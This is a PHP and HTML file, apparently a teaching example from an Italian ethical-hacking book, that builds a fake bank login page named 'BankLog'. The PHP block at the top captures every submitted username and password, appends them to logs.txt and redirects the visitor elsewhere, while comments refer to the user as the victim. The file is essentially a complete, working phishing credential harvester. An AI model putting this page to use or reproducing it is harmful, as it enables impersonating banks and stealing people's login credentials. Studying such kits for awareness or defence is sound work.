<?php
   // Se la vittima ha  compilato il form
   if(isset($_POST['password'])) {
    // Crea le variabili $username e $password
   $username = $_POST['username'];
   $password = $_POST['password'];
   // Apri il file logs.txt
   $logfile = fopen("logs.txt", "a");
   // Aggiungi nel file logs.txt i nuovi dati trovati
   $txt = $username . ":" . $password . ";";
   fwrite($logfile, "\n". $txt);
   // Chiudi il file
   fclose($logfile);
   // Reindirizza a nuovo sito
   header("location: http://example.com"); 
   }
   ?>
<html>
   <head>
      <title>BankLog - Your Bank Login Access</title>
      <style type="text/css">
         body {
         background-color: #bfcb9b;
         padding:5%;
         }
         #container {
         margin: auto;
         background: #fff;
         text-align: center;
         border-radius: 20px;
         padding: 5%;
         }
         #container input {
         display: block;
         border: 1px solid #9aaf6a;
         padding: 10px;
         border-radius: 6px;
         margin: 10px auto;
         max-width: 800px;
         }
         #container input.button {
         background-color: #6e7951;
         color:#fff;
         padding: 10px 20px;
         }
      </style>
   </head>
   <body>
      <div id="container">
         <!-- Immagine dell'istituto bancario -->
         <img src="https://github.com/Hacklogit/hacklog2/raw/master/examples/chapter11/logo-banklog.jpg"><br />
         <!-- Form in cui inserire i dati -->
         <form id="login" name="login" action="index.php" method="POST">
            <input type="text" name="username" placeholder="Username:">
            <input type="text" name="password" placeholder="Password:">
            <input type="submit" class="button" value="Login">
         </form>
      </div>
   </body>
</html>